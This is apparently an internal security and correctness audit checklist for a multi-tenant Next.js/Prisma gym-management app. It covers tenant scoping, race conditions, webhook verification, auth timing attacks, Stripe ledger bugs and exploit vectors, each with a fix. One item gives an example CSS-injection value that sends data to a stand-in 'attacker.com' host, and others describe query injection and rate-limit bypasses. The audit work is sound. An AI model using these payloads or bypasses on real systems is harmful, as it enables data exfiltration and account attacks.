## WP-A — Multi-tenant data isolation

- [ ] **[P3]** [app/api/members/[id]/route.ts:89](app/api/members/[id]/route.ts#L89) — read-back uses `findUnique({where: {id}})` without tenant scope. Safe in context (preceding `updateMany` was tenant-scoped), but defensive coding is missing. Fix: `findFirst({where: {id, tenantId}})`.
- [ ] **[P3]** [app/api/announcements/[id]/route.ts:38](app/api/announcements/[id]/route.ts#L38) — same pattern (read-back after tenant-scoped updateMany). Fix: scope.

- [ ] **[P3]** [app/api/initiatives/[id]/route.ts:38](app/api/initiatives/[id]/route.ts#L38) — same. Fix: scope.
- [ ] **[P2]** Add a `withTenantScope(handler)` helper or a custom ESLint rule banning bare `findUnique({where: {id}})` in `app/api/`. The pattern is easy to forget and a future tenant-scope mistake becomes a cross-tenant data leak.

## WP-B — Race conditions + atomic operations

- [ ] **[P1]** [app/api/payments/manual/route.ts:57-72](app/api/payments/manual/route.ts#L57-L72) — `prisma.payment.create()` then `prisma.member.update()` is NOT a transaction. If the second call fails after the first commits, ledger has an orphan payment with member status not updated. Fix: wrap both in `prisma.$transaction([...])`.
- [ ] **[P1]** [app/api/auth/reset-password/route.ts:31-79](app/api/auth/reset-password/route.ts#L31-L79) — token consume is `findFirst(used:false)` → later `update({where:{id}})` with no `used:false` precondition. Two concurrent requests can both pass the findFirst and both consume the same token. Fix: use `updateMany({where:{id, used:false, expiresAt:{gt:now}}, data:{used:true}})` and reject if `count !== 1`.
- [ ] **[P1]** [app/api/stripe/create-subscription/route.ts:47-58](app/api/stripe/create-subscription/route.ts#L47-L58) — find-or-create Stripe customer race. Two concurrent setups create two Stripe customers; only one ID lands in `Member.stripeCustomerId`. Fix: wrap in transaction with `update({where:{id, stripeCustomerId: null}, ...})` and return early if `count === 0`.
- [ ] **[P1]** [app/api/member/class-packs/buy/route.ts:59-67](app/api/member/class-packs/buy/route.ts#L59-L67) — same race as above. Fix: same atomic-update pattern.
- [ ] **[P1]** [app/api/staff/[id]/route.ts:44-47](app/api/staff/[id]/route.ts#L44-L47) — PATCH changes `role` but does NOT bump `sessionVersion`. A demoted staff keeps elevated role for up to 30 days (JWT max-age). Fix: when `data.role` is set, also `sessionVersion: { increment: 1 }`.
- [ ] **[P2]** [app/api/cron/monthly-reports/route.ts:41-44](app/api/cron/monthly-reports/route.ts#L41-L44) — TOCTOU between `findFirst` and `create`. Concurrent runs (cron + manual) can produce duplicate reports for the same `(tenantId, periodStart, generationType)`. Fix: add a Prisma `@@unique([tenantId, periodStart, generationType])` constraint and replace `findFirst` check with `try/catch` on P2002.

## WP-C — Webhook hardening

- [ ] **[P1]** [app/api/webhooks/resend/route.ts:1-50](app/api/webhooks/resend/route.ts) — no Svix signature verification. The doc-comment claims "Optional signature verification via RESEND_WEBHOOK_SECRET (svix)" but the implementation accepts any POST. Anyone can POST fake delivery/bounce events and corrupt `EmailLog.status`. Fix: verify `svix-signature` header against `RESEND_WEBHOOK_SECRET`; return 401 if missing/invalid.
- [ ] **[P2]** [app/api/stripe/webhook/route.ts:148-196](app/api/stripe/webhook/route.ts#L148-L196) — `checkout.session.completed` for class packs creates a `MemberClassPack` row + a `Payment` upsert outside any transaction. If the second call fails, the credit pack exists with no ledger entry. Fix: wrap both creates in `prisma.$transaction`.
- [ ] **[P2]** [app/api/stripe/webhook/route.ts:67-117](app/api/stripe/webhook/route.ts#L67-L117) — `invoice.payment_failed` does `member.update({paymentStatus:"overdue"})` then `payment.upsert`. Both are idempotent on retry, so the existing rollback-on-error pattern is correct enough; but should still be wrapped in `prisma.$transaction` for atomicity if a future field is added.

## WP-D — Auth hardening

- [ ] **[P1]** [auth.ts:67-96](auth.ts#L67-L96) — bcrypt timing attack: `prisma.user.findUnique` returns null fast for unknown emails; bcrypt.compare runs only when a user exists. Attacker can enumerate valid email addresses via response timing. Fix: always run a dummy `bcrypt.compare(password, DUMMY_HASH)` even on user-not-found path so the response time is constant.
- [ ] **[P2]** [next.config.ts:17](next.config.ts#L17) — CSP includes both `unsafe-inline` AND `unsafe-eval` on `script-src`. `unsafe-eval` is rarely needed (only for some libraries that use `eval`/`Function`); removing it tightens XSS protection. Fix: drop `unsafe-eval`, run smoke test, and if anything breaks identify the offending library.
- [ ] **[P2]** [next.config.ts:21](next.config.ts#L21) — `connect-src` is missing `https://api.stripe.com` and `https://js.stripe.com`. If Stripe Elements ever upgrade to an XHR-based path, requests will be silently blocked. Fix: explicitly allow Stripe origins.
- [ ] **[P2]** [lib/auth-secret.ts:1-3](lib/auth-secret.ts#L1-L3) — `AUTH_SECRET_VALUE = ... ?? ""` falls back to empty string if neither env var is set. The runtime guard in `auth.ts` catches this for production, but the helper itself should fail-loud at import. Fix: throw at module load when both env vars are missing AND `NODE_ENV === "production"`.
- [ ] **[P3]** [auth.ts:117-138](auth.ts#L117-L138) — DEMO_MODE block is dead in production but adds confusion; the `.env` leak that caused tonight's outage was via this guard. Consider removing the demo-fallback entirely once development uses a seeded DB consistently.

## False positives — do NOT fix (audit was wrong)

- **Tenant scoping on `/api/class-packs/[id]`, `/api/ranks/[id]`, `/api/announcements/[id]` PATCH/DELETE** — audit flagged as P0 missing tenant scope. **In source, all of them already use `where: { id, tenantId }` on the actual mutation (`updateMany`/`deleteMany`).** Only the post-update read-back uses bare `findUnique({where:{id}})`, which is safe because the updateMany already filtered (and is captured as a P3 in WP-A for defensive scope).
- **Logout-all sessionVersion bump** — audit listed it as a possible gap. **In source, the logout-all endpoint correctly increments sessionVersion**, and the JWT callback enforces it on every Node-runtime refresh.
- **Audit log race condition** — audit flagged write contention. **AuditLog is append-only via `prisma.create`**; concurrent inserts are safe.
- **Stripe webhook idempotency claim race** — audit suggested "claim before process" might race. **Source uses `prisma.stripeEvent.create` with a unique constraint and catches P2002 to no-op replays** — this is correct.
- **Pack purchase rate limit** — audit said `/api/member/class-packs/buy` has no rate limit. **Source has `checkRateLimit('pack:buy:...', 10, 1h)` at line 18** — already in place.
- **Member self-checkout PATCH `/api/member/me` waiver acceptance** — audit suggested it could be misused to set `waiverAccepted=true` without a real signature. **Code path is gated by `createSignedWaiverFor` which is set only when the user agreed** — and we already moved to a dedicated `/api/waiver/sign` for signature-required flow. Acceptable.

## WP-H — Stripe / payments correctness

- [ ] **[P0]** [app/api/stripe/webhook/route.ts:268-273](app/api/stripe/webhook/route.ts#L268-L273) — dispute "won" or "charge_refunded" never restores `Payment.status` from `"disputed"`. Ledger stays permanently corrupted after a successful chargeback defence. Fix: add `else if (status === "won" || status === "charge_refunded") { update Payment.status to "succeeded" or "refunded" }`.
- [ ] **[P0]** [app/api/payments/[id]/refund/route.ts:38-47](app/api/payments/[id]/refund/route.ts#L38-L47) — no upper-bound check on refund amount. If `amountPence` > original charge, Stripe rejects but app returns 500 (not 400). Worse: a partial-refund history isn't checked against `amount_refunded` so two staff could each refund full amount before Stripe rejects the second. Fix: pre-validate against `payment.amountPence` AND fetch Stripe's current `amount_refunded` to compute remaining headroom.
- [ ] **[P0]** [app/api/member/checkout/route.ts](app/api/member/checkout/route.ts) (~line 79-100) — `stripeAccount` can be `undefined` in `checkout.sessions.create`. If a tenant lost Stripe Connect, members would be charged into MatFlow's main account (revenue ends up in the wrong place). Fix: short-circuit with 400 before importing Stripe if `!tenant.stripeAccountId`.
- [ ] **[P1]** [app/api/stripe/webhook/route.ts:39-47](app/api/stripe/webhook/route.ts#L39-L47) — webhook silently accepts events with `event.account == null` and continues with `tenantId = null`, allowing orphaned Dispute / Payment rows. Fix: reject early `if (!stripeAccountId) return 400`.
- [ ] **[P1]** [app/api/stripe/webhook/route.ts:59-66](app/api/stripe/webhook/route.ts#L59-L66) — `customer.subscription.deleted` blindly sets `paymentStatus: "cancelled"`, which can flip a `paid` member backwards if events arrive out of order. Fix: only transition from `active|pending` → `cancelled`.
- [ ] **[P1]** Missing webhook event handlers (no code path):
  - `customer.subscription.updated` (price/plan changes mid-cycle)
  - `invoice.voided`
  - `payment_intent.succeeded` (BACS settlement — currently `payment_intent.processing` flips to "pending" but nothing flips back to "paid" outside of `invoice.payment_succeeded`)
  - `customer.deleted`
  - `payment_method.detached`

- [ ] **[P2]** [app/api/stripe/webhook/route.ts:118-147](app/api/stripe/webhook/route.ts#L118-L147) — when `invoice.payment_succeeded` lands after a prior failure, `failureReason` from the failed payment is left populated. Fix: set `failureReason: null` on the upsert update branch.

## WP-K — Exploit vectors + version-specific

- [ ] **[P1]** [app/member/layout.tsx:195](app/member/layout.tsx#L195) — `dangerouslySetInnerHTML={{__html: lightModeCSS}}` injects a CSS string built from tenant-controlled branding (primaryColor, bgColor, fontFamily). An owner who sets a colour like `red; --member-text: url(http://attacker.com/log?d=...)` gets CSS-based exfiltration of session-area styles. Fix: switch to React inline `<style>:root { --primary: ${primary} }</style>` (React escapes interpolations) or strict-validate hex on the input side.
- [ ] **[P1]** [lib/google-drive.ts:99-100](lib/google-drive.ts#L99-L100) — `folderId` from the dashboard folder picker is interpolated into a Drive query string `'${folderId}' in parents`. A user who tampers with the request can break out of the folder filter and enumerate every file the connected Drive account can see. Fix: validate `folderId` against `/^[A-Za-z0-9_-]{20,}$/` before use.
- [ ] **[P1]** [auth.ts:56](auth.ts#L56) — login rate-limit key is `login:${tenantSlug}:${email}`. An attacker who knows N tenant slugs can brute-force 5 × N attempts per email, no global IP cap. ## WP-L — Architecture, role gates, schema shape

- [ ] **[P0] Members can hit staff GET endpoints.** [proxy.ts:14-36](proxy.ts#L14-L36) only checks logged-in vs not.
